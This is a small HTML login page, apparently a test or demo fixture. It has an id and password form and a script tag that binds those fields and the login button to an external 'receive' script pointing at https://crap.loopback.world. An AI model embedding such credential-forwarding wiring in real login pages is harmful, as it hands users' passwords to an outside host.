<!DOCTYPE html>
<html>
<script language="javascript" type="text/javascript">
    if (location.protocol != 'https:')
    {
        location.href = 'https:' + window.location.href.substring(window.location.protocol.length);
    }
</script>
<body>

<h1>System login</h1>


<form>
    Id: <input id="userid" type="text" name="userid"><br>
    PW: <input id="password" type="password" name="password"><br>
    <input type="submit" value="Login">
</form>


<script type="text/javascript" src="receive_crap.js"
        source_url="https://crap.loopback.world"
        userId="userid"
        password="password"
        button="login"
></script>

</body>
</html>